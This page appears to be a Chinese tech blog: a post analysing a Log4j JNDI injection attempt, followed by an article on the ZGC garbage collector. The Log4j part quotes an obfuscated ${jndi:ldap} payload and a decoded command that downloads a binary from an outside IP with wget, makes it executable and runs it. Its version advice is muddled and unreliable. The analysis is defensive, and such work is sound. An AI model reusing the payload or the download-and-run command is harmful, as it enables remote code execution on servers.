 <p><img alt="" height="265" src="https://img-blog.csdnimg.cn/f9f816e0632b4d97824b7df2c66a85c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p>&nbsp;运行起来发现被植入了一段特殊的字符。</p> 
 <p><img alt="" height="374" src="https://img-blog.csdnimg.cn/21c480314e2b41728f8553e1af0068a0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p>&nbsp;这不是被人黑了吗。</p> 
 <p></p> 
 <p><strong>下面是我模拟的黑客自己搭建的攻击服务，可以选择性观看。</strong></p> 
 <p><img alt="" height="495" src="https://img-blog.csdnimg.cn/3573f5d9fc614c18a261ec5c36885981.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p>127.0.0.1:80是我启动的一台nginx服务器，在其html文件下将编译好的EviObj的class文件放在了其下面。</p> 
 <p>EviObj类里面只有一个简答的打印代码。</p> 
 <p><img alt="" height="212" src="https://img-blog.csdnimg.cn/b1c2bafa599b4f3a9a191cc2b12d085e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="994"></p> 
 <p>&nbsp;然后就出现了之前的注入问题。</p> 
 <p>简单来说，就是log4j识别了字符串包中特殊的${jndi:rmi: }，log4j对其进行了远程调用，而黑客输入的地址正好是他部好侵入代码的地址，这样就在我们的代码中植入了黑客的代码。</p> 
 <p></p> 
 <p><strong>关于如何避免，我当然要看一下我们公司的程序会不会被攻击呀。</strong></p> 
 <p>如果你使用了 Java 8 或以上版本，基本对你没有什么危害。因为在 Java 8 中添加了一个新的属性 com.sun.jndi.rmi.object.trustURLCodebase，这是一个 boolean 类型。默认值是 false。</p> 
 <p>其实我刚才的代码也是隐藏了一部分，我把这个属性打开了才实验成功的。</p> 
 <p><img alt="" height="450" src="https://img-blog.csdnimg.cn/b272fe90a5e3426c904df05f236cab5b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p>&nbsp;而我们用的就是jdk8，所以第一个条件我们就规避成功避免了注入的条件。</p> 
 <p>其次log4j的版本是log4j 2.x&nbsp; -- log4j 2.4.0之间，如果处于这个版本区间需要升级到2.5.0版本方可。</p> 
 <p>而我们公司使用的版本是1.7.25版本 。</p> 
 <p><strong>然后最近我发现我们华为云上的一个项目确实被攻击了o(╥﹏╥)o，应该没有成功。</strong></p> 
 <p><strong>日志内容如下：</strong></p> 
 <p><img alt="" height="223" src="https://img-blog.csdnimg.cn/25e862aa81664787aaac24fa1a92e494.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p>&nbsp;第一段</p> 
 <p>{${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}</p> 
 <p>${env:NaN:-j} 等于 j&nbsp;</p> 
 <p>${env:NaN:-:} 等于：</p> 
 <p>${env:NaN:-l} 等于 l</p> 
 <p>那解析完不就是${jndi:ldap: xxxx}，靠真是jndi注入</p> 
 <p>然后再看bease 64部分解析结果如下：</p> 
 <p><img alt="" height="402" src="https://img-blog.csdnimg.cn/dc6f2c7e99b44e7f856ea81f690f4797.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1175"></p> 
 <p>&nbsp;wget http://209.141.46.114/reader : 网站下载reader文件</p> 
 <p>chmod 777 reader ： 修改reader权限为 777</p> 
 <p>./reader runner ：运行reader文件</p> 
 <p>真是太阴险了，谁知道这reader是什么病毒啊 [○･｀Д´･ ○]</p> 
 <p>我还真去下载了一下这个reader，但现在下来发现是编译后文件又用upx加壳的文件，解壳后又要反编译，我没有反编译出来也就只能到此为止了。</p> 
 <p></p> 
</div>
## 关于我
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-04-27T09:20:46.000Z" title="2023/4/27 17:20:46">2023-04-27</time>发表</span><span class="level-item"><time dateTime="2023-04-27T09:23:11.367Z" title="2023/4/27 17:23:11">2023-04-27</time>更新</span><span class="level-item">1 小时读完 (大约13402个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/27/%E3%80%90JVM%E3%80%91%E6%9E%81%E8%87%B4%E4%BD%8E%E5%BB%B6%E8%BF%9F%E6%94%B6%E9%9B%86%E5%99%A8ZGC%E6%8E%A2%E7%B4%A2%E2%80%94%E2%80%94%E4%BA%9A%E6%AF%AB%E7%A7%92%E7%BA%A7%EF%BC%8C%E5%B8%B8%E6%95%B0%E7%BA%A7%E6%9A%82%E5%81%9CO(1)%E5%8E%9F%E7%90%86/">【JVM】极致低延迟收集器ZGC探索——亚毫秒级，常数级暂停O(1)原理</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h2 id="jvm极致低延迟收集器zgc探索亚毫秒级常数级暂停o1原理"><a class="markdownIt-Anchor" href="#jvm极致低延迟收集器zgc探索亚毫秒级常数级暂停o1原理">#</a> 【JVM】极致低延迟收集器 ZGC 探索 —— 亚毫秒级，常数级暂停 O (1) 原理</h2>
<div id="content_views" class="markdown_views prism-atom-one-dark"> 
 <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"> <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path> 
 </svg> 
 <p></p> 
 <div class="toc"> 
  <h3>文章目录</h3> 
  <ul>
   <li><a href="#ZGC__1">ZGC 收集器</a></li>
   <li>
    <ul>
     <li><a href="#ZGC_21">ZGC历程</a></li>
     <li><a href="#ZGC__53">ZGC 特性</a></li>
     <li>
      <ul>
       <li><a href="#_63">基于区块的内存模型</a></li>
      </ul> </li>
     <li><a href="#_80">完全并发原理</a></li>
     <li>
      <ul>
       <li><a href="#G1_82">G1的回收时停顿</a></li>
       <li><a href="#ZGC_100">ZGC的标记—复制算法</a></li>
       <li><a href="#ZGC_132">ZGC对象定位</a></li>
       <li>
        <ul>
         <li><a href="#_Color_Pointer_135">着色指针 `Color Pointer`</a></li>
         <li><a href="#_View_181">内存视图 `View`</a></li>
         <li><a href="#_Load_Barrier_202">读屏障 `Load Barrier`</a></li>
         <li><a href="#_Forwarding_Table_222">转移表 `Forwarding Table`</a></li>
         <li><a href="#_227">并发标记过程</a></li>
        </ul> </li>
       <li><a href="#_Stack_Watermark_Barrier_243">栈水印屏障 `Stack Watermark Barrier`</a></li>
      </ul> </li>
     <li><a href="#ZGC__275">ZGC 其他特性</a></li>
     <li>
      <ul>
       <li><a href="#_276">支持非统一内存访问架构</a></li>
       <li><a href="#_288">就地重定位</a></li>
      </ul> </li>
     <li><a href="#Azul_Zing_C4_GC_305">对比Azul Zing C4 GC</a></li>
     <li><a href="#_316">总结</a></li>
     <li>
      <ul>
       <li><a href="#ZGC__317">ZGC 优点</a></li>
       <li><a href="#ZGC__326">ZGC 缺点</a></li>
      </ul> </li>
     <li><a href="#ZGC_336">ZGC使用</a></li>
     <li>
      <ul>
       <li><a href="#_337">低版本可用</a></li>
       <li><a href="#ZGC_344">ZGC参数说明</a></li>
       <li><a href="#ZGC_366">ZGC的垃圾回收什么情况下会被触发？</a></li>
      </ul> </li>
     <li><a href="#ZGC_373">ZGC调优</a></li>
    </ul> </li>
   <li><a href="#_398">参考</a></li>
  </ul> 
 </div> 
 <p></p> 
 <h1><a id="ZGC__1"></a>ZGC 收集器</h1> 
 <p>ZGC收集器（Z Garbage Collector）是由Oracle公司为HotSpot JDK研发的，最新一代垃圾收集器。有说法使用这个名目标是取代之前的大部分垃圾收集器，所以才叫ZGC，表示极致的Extremely，或者最后的，垃圾收集器。类似 ZFS（文件系统），ZFS（文件系统）在它刚问世时在许多方面都是革命性的。</p> 
 <p><a target="_blank" rel="noopener" href="https://wiki.openjdk.org/display/zgc/Main">ZGC官网</a></p> 
 <blockquote> 
  <p>但是ZGC官方文档说<code>ZGC</code>这只是个名字，不代表任何含义。看你相信哪种了，笑</p> 
 </blockquote> 
 <ul>
  <li>设计目标<br> 希望能在尽可能对吞吐量影响不太大的前提下，实现在任意堆内存大小下都可以把垃圾收集的停顿时间限制在10ms以内的低延迟。 
   <ul>
    <li>停顿时间不超过10ms；</li>
    <li>停顿时间不会随着堆的大小，或者活跃对象的大小而增加；</li>
    <li>支持8MB~4TB级别的堆（未来支持16TB）。</li>
   </ul> </li>
 </ul> 
 <blockquote> 
  <p>主流的常见操作系统，比如Linux,Windows,MacOS,FreeBSD都是非实时操作系统。非实时操作系统的一个处理器时间片都在5~20毫秒，面向服务端的系统一个线程调度事件需要3-5个时间片，客户端系统则更多。10毫秒停顿已经可以认为是系统误差级的停顿，低于 Linux 内核的背景噪声，即调度开销和系统调用开销，此时ZGC基本已经成为无停顿GC。</p> 
 </blockquote> 
 <p>ZGC设计目标停顿时间在10ms以下，10ms其实是一个很保守的数据，在SPECjbb 2015基准测试中，128G的大堆下最大停顿时间才1.68ms，远低于10ms。<br> 而且ZGC目前的进展很快，在JDK17的测试中和shenandoah gc双双实现了亚毫秒(&lt;1ms)的GC暂停。<br> <a href="https://link.zhihu.com/?target=https://developers.redhat.com/articles/2021/09/16/shenandoah-openjdk-17-sub-millisecond-gc-pauses#">Shenandoah in OpenJDK 17: Sub-millisecond GC pauses | Red Hat Developer</a><br> 不负极致之名，Java17之后采用ZGC是最好的选择。</p> 
 <h2><a id="ZGC_21"></a>ZGC历程</h2> 
 <p>在Java11推出实验性的ZGC以来，历经数年开发，ZGC在当前已经新增了众多特性。<br> 一些关于ZGC特性、原理的文章已经稍有过时，比如ZGC只支持4TB大小的堆，ZGC不支持类卸载，ZGC只支持Linux/x64架构等。</p> 
 <p>不过通过这些文章对ZGC进行了解还是可行的。</p> 
 <p>ZGC各版本特性变化</p> 
 <ul>
  <li>JDK 12 
   <ul>
    <li>支持并发类卸载</li>
   </ul> </li>
  <li>JDK 13 
   <ul>
    <li>支持最大堆从4TB提升到16TB</li>
    <li>支持Linux/AArch64架构</li>
    <li>支持归还未使用内存</li>
   </ul> </li>
  <li>JDK 14 
   <ul>
    <li>支持MacOS/x64、Windows/x64架构</li>
    <li>支持最低8M的小堆</li>
   </ul> </li>
  <li>JDK 15 
   <ul>
    <li>生产就绪</li>
    <li>支持类数据共享（CDS）</li>
    <li>支持压缩类指针（对象头）</li>
    <li>支持渐进式归还内存</li>
   </ul> </li>
  <li>JDK 16 
   <ul>
    <li>新增并发线程栈扫描特性</li>
    <li>支持对象就地迁移</li>
    <li>支持Windows/aarch64架构</li>
   </ul> </li>
  <li>JDK 17 
   <ul>
    <li>新增动态GC线程数特性</li>
    <li>新增JVM快速退出特性</li>
    <li>支持macOS/aarch64架构</li>
   </ul> </li>
  <li>JDK 18 
   <ul>
    <li>支持字符串重复数据删除</li>
    <li>支持Linux/PowerPC架构</li>
   </ul> </li>
 </ul> 
 <h2><a id="ZGC__53"></a>ZGC 特性</h2> 
 <ul>
  <li>完全并发</li>
  <li>使用着色指针</li>
  <li>使用读屏障</li>
  <li>基于区块的内存模型</li>
  <li>支持就近分配的NUMA处理器架构</li>
  <li>压缩内存</li>
 </ul> 
 <p>其中完全并发的能力，是通过<strong>着色指针，读屏障，基于区块的内存模型</strong>来实现的，算是ZGC的<strong>基础特性</strong>。后面会首先研究。<br> 支持就近分配的NUMA处理器架构，压缩内存等是性能提升措施，会在完全并发之后介绍。</p> 
 <h3><a id="_63"></a>基于区块的内存模型</h3> 
 <p>类似于G1，ZGC也采用基于区块(<code>Region</code>)的堆内存布局，每个区块被称为<code>ZPage</code>。不同于G1的是，ZGC的区块具有动态性。ZGC的区块，支持动态创建和销毁，支持动态的区域容量大小变化。<br> ZGC区块分为以下几种</p> 
 <ul>
  <li> <p>小型区块（<code>Small Region</code>）：<br> 容量固定为2MB，用于放置小于256KB的小对象。</p> </li>
  <li> <p>中型区块（<code>Medium Region</code>）：<br> 容量固定为32MB，用于放置大于等于256KB但小于4MB的对象。</p> </li>
  <li> <p>大型区块（<code>Large Region</code>）：<br> 容量不固定，可以动态变化，但必须为2MB的整数倍，用于放置4MB或以上的大对象。每个大型Region中只会存放一个大对象，所以实际容量可能小于中型Region，最小容量可低至4MB。大型Region在ZGC的实现中是不会被重分配的，因为复制一个大对象的代价非常高昂。</p> </li>
 </ul> 
 <p><img src="https://img-blog.csdnimg.cn/img_convert/1eaac553ce4d82f137754de097cde9c0.png#pic_center" alt="ZPage"><br> 可以看到相比G1，ZGC的区块动态性不包括堆内存的每个区块可以根据运行情况的需要，扮演年轻代的Eden、Survivor区域、老年代区域、或者大对象(Humongous)区域。这是因为ZGC目前并不支持分代垃圾回收，没错，ZGC这个强大的收集器目前并不支持分代，据说是因为实现分代太复杂了，连Oracle团队也比较棘手。但不代表ZGC就不会用分代模型，已经有让ZGC支持分代回收的提案了<a target="_blank" rel="noopener" href="https://openjdk.org/jeps/439">JEP439</a>，就看未来什么时候能实现。</p> 
 <h2><a id="_80"></a>完全并发原理</h2> 
 <p>ZGC的最大特性就是做到了GC过程中的大部分阶段都能和用户线程并发，只有极少阶段（&lt;1ms）需要停顿，那么ZGC是如何做到的呢？</p> 
 <h3><a id="G1_82"></a>G1的回收时停顿</h3> 
 <p>G1和ZGC都基于标记-复制算法，但算法具体实现的不同就导致了巨大的性能差异。</p> 
 <p>以G1为例，通过G1中标记-复制算法过程（G1的Young GC和Mixed GC均采用该算法），分析G1的混合回收中停顿耗时的主要瓶颈。<br> <img src="https://img-blog.csdnimg.cn/b900e50509c24fd892f3b19b8ca29c64.png" alt="G1中标记-复制算法过程"><br> 已知G1混合回收采用了标记—复制的算法，混合回收(MixedGC)过程可以分为标记阶段、筛选回收阶段。其中筛选回收又分为清理阶段和复制阶段。</p> 
 <ul>
  <li>标记阶段停顿分析 耗时较短 
   <ul>
    <li>初始标记阶段：初始标记阶段是指从GC Roots出发标记全部直接子节点的过程，该阶段是STW的。由于GC Roots数量不多，通常该阶段耗时非常短。</li>
    <li>并发标记阶段：并发标记阶段是指从GC Roots开始对堆中对象进行可达性分析，找出存活对象。该阶段是并发的，即应用线程和GC线程可以同时活动。并发标记耗时相对长很多，但因为不是<em>程序停顿</em>，所以我们不太关心该阶段耗时的长短。</li>
    <li>再标记阶段：重新标记那些在并发标记阶段发生变化的对象。该阶段是STW的。</li>
   </ul> </li>
  <li>清理阶段停顿分析 耗时较短<br> 清理阶段识别出有存活对象的分区和没有存活对象的分区，该阶段不会清理垃圾对象，也不会执行存活对象的复制。该阶段是<em>程序停顿</em>的。</li>
  <li>复制阶段停顿分析 <strong>耗时较长</strong><br> 复制算法中的转移阶段需要分配新内存和复制对象的成员变量。转移阶段是<em>程序停顿</em>的，其中内存分配通常耗时非常短，但对象成员变量的复制耗时有可能较长，这是因为复制耗时与存活对象数量与对象复杂度成正比。对象越复杂，复制耗时越长。</li>
 </ul> 
 <p>四个STW过程中，初始标记因为只标记GC Roots，耗时较短。再标记因为对象数少，耗时也较短。清理阶段因为内存分区数量少，耗时也较短。 <strong>复制-转移阶段要处理所有存活的对象，耗时会较长。因此，G1停顿时间的瓶颈主要是标记-复制算法中的复制-转移阶段的<em>程序停顿</em></strong> 。为什么转移阶段不能和标记阶段一样并发执行呢？主要是G1未能解决转移过程中准确定位对象地址的问题。</p> 
 <h3><a id="ZGC_100"></a>ZGC的标记—复制算法</h3> 
 <p>与G1类似，ZGC也采用标记-复制算法，不过ZGC对该算法做了重大改进：ZGC在标记、转移和重定位阶段几乎都是并发的，这是ZGC实现停顿时间小于10ms目标的最关键原因。</p> 
 <p><img src="https://img-blog.csdnimg.cn/4eae71dfced44545b02e6f3768712ee3.png" alt="ZGC的标记—复制算法"><br> ZGC中的一次垃圾回收过程会被分为十个步骤：初始标记、并发标记、再次标记、并发转移准备：[非强引用并发标记、重置转移集、回收无效页面（区）、选择目标回收页面、初始化转移集（表）]、初始转移、并发转移。但是只有三个阶段需要停顿(STW)：<strong>初始标记，再标记，初始转移</strong>。其中，初始标记和初始转移分别都只需要扫描所有GC Roots，其处理时间和GC Roots的数量成正比，一般情况耗时非常短；再标记阶段STW时间很短，最多1ms，超过1ms则再次进入并发标记阶段。即，ZGC几乎所有暂停都只依赖于GC Roots集合大小，停顿时间不会随着堆的大小或者活跃对象的大小而增加。与ZGC对比，G1的转移阶段完全STW的，且停顿时间随存活对象的大小增加而增加。</p> 
 <ul>
  <li>①初始标记<br> 这个阶段会触发STW，仅标记根可直达的对象，并将其压入到标记栈中，在该阶段中也会发生一些其他动作，如重置 TLAB、判断是否要清除软引用等。</li>
  <li>②并发标记<br> 根据「初始标记」的根对象开启多条GC线程，并发遍历对象图，同时也会统计每个分区/页面中的存活对象数量。</li>
  <li>③再次标记<br> 这个阶段也会出现短暂的STW，因为「并发标记」阶段中应用线程还是在运行的，所以会修改对象的引用导致漏标的情况出现，因此需要再次标记阶段来标记漏标的对象（如果此阶段停顿时间过长，ZGC会再次进入并发标记阶段重新标记）。</li>
  <li>并发转移准备<br> 4~8阶段都是并发转移对象的准备阶段，各子阶段又分别处理了不同事务 
   <ul>
    <li>④非强引用并发标记和引用并发处理<br> 遍历前面过程中的非强引用类型根对象，但并不是所有非强根对象都可并发标记，有部分不能并发标记的非强根对象会在前面的「再次标记」阶段中处理。同时也会标记堆中的非强引用类型对象。</li>
    <li>⑤重置转移集/表<br> 重置上一次GC发生时，转移表中记录的数据，方便本次GC使用。<br> 在ZGC中，因为在回收时需要把一个分区中的存活对象转移进另外一个空闲分区中，而ZGC的转移又是并发执行的，因此，一条用户线程访问堆中的一个对象时，该对象恰巧被转移了，那么这条用户线程根据原本的指针是无法定位对象的，所以在ZGC中引入了转移表<code>forwardingTable</code>的概念。<br> 转移表可以理解为一个<code>Map&lt;OldAddress,NewAddress&gt;</code>结构的集合，当一条线程根据指针访问一个被转移的对象时，如果该对象已经被转移，则会根据转移表的记录去新地址中查找对象，并同时会更新指针的引用。</li>
    <li>⑥回收无效分区/页面<br> 回收物理内存已经被释放的无效的虚拟内存页面。ZGC是一款支持返还堆内存给物理机器的收集器，在机器内存紧张时会释放一些未使用的堆空间，但释放的页面需要在新一轮标记完成之后才能释放，所以在这个阶段其实回收的是上一次GC释放的空间。</li>
    <li>⑦选择待回收的分区/页面<br> ZGC与G1收集器一样，也会<strong>存在「垃圾优先」的特性</strong>，在标记完成后，整个堆中会有很多分区可以回收，ZGC也会<strong>筛选出回收价值最大的页面</strong>来作为本次GC回收的目标。</li>
    <li>⑧初始化待转移集合的转移表<br> 初始化待回收分区/页面的转移表，方便记录区中存活对象的转移信息。<br> 注：每个页面/分区都存在一个转移表<code>forwardingTable</code>。</li>
   </ul> </li>
  <li>⑨初始转移<br> 这个阶段会发生STW，遍历所有GCRoots节点及其直连对象，如果遍历到的对象在回收分区集合内，则在新的分区中为该对象分配对应的空间。不过值得注意的是：该阶段只会转移根对象（也就是GCRoots节点直连对象）。</li>
  <li>⑩并发转移<br> 这个阶段与之前的「并发标记」很相似，从上一步转移的根对象出发，遍历目标区域中的所有对象，做并发转移处理。</li>
 </ul> 
 <h3><a id="ZGC_132"></a>ZGC对象定位</h3> 
 <p>ZGC通过着色指针和读屏障技术，解决了转移过程中准确访问对象的问题，实现了并发转移。大致原理描述如下：并发转移中“并发”意味着GC线程在转移对象的过程中，应用线程也在不停地访问对象。假设对象发生转移，但对象地址未及时更新，那么应用线程可能访问到旧地址，从而造成错误。而在ZGC中，应用线程访问对象将触发“读屏障”，如果发现对象被移动了，那么“读屏障”会把读出来的指针更新到对象的新地址上，这样应用线程始终访问的都是对象的新地址。那么，JVM是如何判断对象被移动过呢？就是利用对象引用的地址，即着色指针。</p> 
 <h4><a id="_Color_Pointer_135"></a>着色指针 <code>Color Pointer</code></h4> 
 <p>已知Java虚拟机垃圾回收时的可达性分析使用了标记-整理类算法。从垃圾回收扫描根集合开始标记存活对象，那么这些标记被储存在哪里？</p> 
 <p>HotSpot虚拟机的标记实现方案有如下几种</p> 
 <ul>
  <li>把标记直接记录在对象头上<br> 如Serial收集器</li>
  <li>把标记记录在与对象相互独立的数据结构上<br> 如G1、Shenandoah使用了一种相当于堆内存的1/64大小的，称为BitMap的结构来记录标记信息</li>
  <li>直接把标记信息记在引用对象的指针上<br> 如ZGC</li>
 </ul> 
 <p><strong>为什么可以把引用关系放在指针上？</strong></p> 
 <p>可达性分析算法的标记阶段就是看有没有引用，所以可以只和指针打交道而不管指针所引用的对象本身。<br> 例如使用三色标记法标记对象是否可达，这些标记本质上只和对象引用有关，和对象本身无关。只有对象的引用关系才能决定它的存活。</p> 
 <p><strong>着色指针</strong>是一种直接将少量额外的信息存储在对象指针上的技术。目前在X64架构的操作系统中高16位是不能用来寻址的。程序只能使用低48位，<br> ZGC将低48位中的高4位取出，用来存储4个标志位。剩余的44位可以支持16TB(2的44次幂)的内存，也即ZGC可以管理的内存不超过16TB。<br> 4个标志位即<strong>着色位</strong>，所以这种指针被称为着色指针。<br> <em><strong>在ZGC中标记信息被直接记在引用对象的着色指针上，这样通过对象着色指针就可以获取 GC 标记，解决转移过程中准确定位对象地址的问题。</strong></em></p> 
 <p>因此，ZGC只能在64位系统上，因为ZGC的<strong>着色指针</strong>使用的是44-48位，32位的x86架构系统显然不支持，并且因为ZGC已经把48位可用的指针地址空间全部使用了，自然也不支持压缩指针。<br> <img src="https://img-blog.csdnimg.cn/78024bccd7194d40aa76b6394d1d28f2.png" alt="着色指针"></p> 
 <blockquote> 
  <p>压缩指针和压缩类指针是两个不同的特性，后者又叫压缩对象头，ZGC是支持压缩对象头这一特性的，在JDK15后提供。</p> 
 </blockquote> 
 <p><img src="https://img-blog.csdnimg.cn/img_convert/89112b34a4cff3d0a3350441d17455ef.png#pic_center" alt="着色位"><br> ZGC的四个着色位可以记录四种垃圾回收标记状态，即<code>marked0、marked1、remapped、Finalizable</code>,好像给指针染上了四种不同的颜色，所以叫做着色指针。</p> 
 <blockquote> 
  <ul>
   <li>指针如何实现染色<br> 指针的原本的作用在于寻址，如果我们想实现染色指针，就得把43~46位赋予特殊含义，这样寻址就不对了。所以最简单的方式是寻址之前把指针进行裁剪，只使用低44位去寻址（最大16TB内存）这样做导致的问题是，需要将裁剪指针寻址地址的 CPU 指令添加到生成的代码中，会导致应用程序变慢。<br> 为了解决上面指针裁剪的问题，ZGC 使用了<code>mmap</code>内核函数进行多虚拟地址内存映射。使用 mmap 可以将同一块物理内存映射到多个虚拟地址上。这样，就可以实现堆中的一个对象，有4个虚拟地址，不同的地址标记不同的状态 marked0、marked1、remapped，Finalizable。且都可以访问到内存。这样实现了指针染色的目的，且不用对指针进行裁剪，提高了效率。</li>
  </ul> 
 </blockquote> 
 <p>着色指针的四个着色状态</p> 
 <ul>
  <li>Finalizable=1000 <strong>终结状态</strong><br> 表示对象已经要被回收了，此位与并发引用处理有关，表示这个对象只能通过finalizer才能访问。</li>
  <li>Remapped=0100 <strong>未扫描状态</strong><br> 设置此位的值后，表示这个对象未指向RelocationSet中（relocation set表示需要GC的Region分区/页面集合）。</li>
  <li>Marked1=0010 <strong>已标记状态</strong><br> 对象已标记状态，用于辅助GC。</li>
  <li>Marked0=0001 <strong>已标记状态</strong><br> 对象已标记状态，用于辅助GC。</li>
 </ul> 
 <blockquote> 
  <p>为什么会有两个Marked标识<br> 这是为了防止不同GC周期之间的标记混淆，所以搞了两个Marked标识，每当新的一次GC开始时，都会交换使用的标记位。例如：第一次GC使用M0，第二次GC就会使用M1，第三次又会使用M0…，因为ZGC标记完所有分区的存活对象后，会选择分区进行回收，因此有一部分区域内的存活对象不会被转移，那么这些对象的标识就不会复位，会停留在之前的Marked标识（比如M0），如果下次GC还是使用相同M0来标记对象，那混淆了这两种对象。为了确保标记不会混淆，所以搞了两个Marked标识交替使用。</p> 
 </blockquote> 
 <h4><a id="_View_181"></a>内存视图 <code>View</code></h4> 
 <p>内存视图是指ZGC对Java对象状态的一种描述，<strong>通过内存视图和着色指针配合，ZGC得以完成在并发转移对象的同时准确定位对象地址</strong>。<br> ZGC将所有对象划分为 3 种不同的视图（状态）：<code>marked0、marked1、remapped</code>，同一时刻只能处于其中一种视图（状态）。比如：</p> 
 <ul>
  <li> <p>在没有进行垃圾回收时，视图为<code>remapped</code> 。</p> </li>
  <li> <p>在 GC 进行标记开始，将视图从 <code>remapped </code>切换到<code>marked0/marked1 </code>。</p> </li>
  <li> <p>在 GC 进行转移阶段，又将视图从<code>marked0/marked1 </code>切换到<code>remapped</code>。</p> </li>
  <li> <p>“好”指针和“坏”指针<br> 任意线程当前访问对象的指针的着色状态和当前所处的视图<strong>一致</strong>时，则当前指针为** “好”指针** ；当前指访问对象的指针的状态和当前所处的视图<strong>不一致</strong>时，则为**“坏”指针**。<br> 线程访问到好指针无需处理，直接通过指针访问对象地址。</p> </li>
  <li> <p>触发读屏障<br> 线程访问到坏指针时，在不同阶段会有不同的处理，处理过程在读屏障中实现。</p> 
   <ul>
    <li>标记阶段<br> 访问到坏指针时，说明此对象存活且未被标记，会将指针着色状态调整为已标记的M0/M1状态。</li>
    <li>转移阶段<br> 访问到坏指针时，说明此对象需要被移动。线程会转移对象，然后将指针着色状态调整为未标记的Remapped状态，等待下轮GC扫描。不仅是GC线程，应用线程访问到坏指针时也会转移对象，这称为应用线程的协作转移。这样做让对象转移成为并发的过程，无需等待GC线程转移对象，应用线程自己就可以完成转移。</li>
   </ul> </li>
  <li> <p>着色指针的**“自愈”**<br> 通过上面的说明，发现线程访问到坏指针，在触发读屏障处理后，又恢复成好指针，且直到下轮GC之间无需再处理，线程可以直接访问对象。这一特性被称之为，ZGC的指针拥有“自愈”能力。</p> </li>
 </ul> 
 <h4><a id="_Load_Barrier_202"></a>读屏障 <code>Load Barrier</code></h4> 
 <p>读屏障是一小段在特殊位置由 JIT 注入的代码，类似我们 JAVA 中常用的 AOP 技术；主要目的是处理GC并发转移后地址定位问题，对象漏标问题。</p> 
 <pre><code class="prism language-c">Object o <span class="token operator">=</span> obj<span class="token punctuation">.</span>fieldA<span class="token punctuation">;</span> <span class="token comment">// 只有从堆中获取一个对象时，才会触发读屏障</span>
<p><span class="token comment">// 读屏障伪代码</span><br>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>o <span class="token operator">&amp;</span> good_bit_mask<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;<!-- --></span><br>
<span class="token keyword">if</span> <span class="token punctuation">(</span>o <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">&#123;<!-- --></span><br>
<span class="token comment">// 处理并注册地址</span><br>
<span class="token function">slow_path</span><span class="token punctuation">(</span><span class="token function">register_for</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">address_of</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>fieldA<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><br>
<span class="token punctuation">&#125;</span><br>
</code></pre></p>
 <ul>
  <li> <p>处理对象漏标问题<br> 读屏障是在读取成员变量时，统统记录下来，这种做法是保守的，但也是安全的。根据三色标记法，引发漏标问题必须要满足两个条件，其中条件二为：「已经标为黑色的对象重新与白色对象建立了引用关系」，也就是已经标记过的存活对象（黑色对象）重新和垃圾对象（白色对象）建立了引用关系，而黑色对象想要与白色对象重新建立引用的前提是：得先读取到白色对象，此时读屏障的作用就出来了，可以直接记录谁读取了当前白色对象，然后在「再次标记」重新标记一下这些黑色对象即可。</p> </li>
  <li> <p>处理并发转移时对象地址定位问题<br> GC发生后，堆中一部分存活对象被转移，当应用线程读取对象时，可以利用读屏障通过指针上的标志来判断对象是否被转移，如果读取的对象已经被转移（线程读取到<em>坏指针</em>），那么则修正当前对象引用为最新地址（去转移表中查）。这样做的好处在于：下次其他线程再读取该转移对象时，可以正常访问读取到最新值（着色指针的<em>自愈</em>）。</p> </li>
 </ul> 
 <h4><a id="_Forwarding_Table_222"></a>转移表 <code>Forwarding Table</code></h4> 
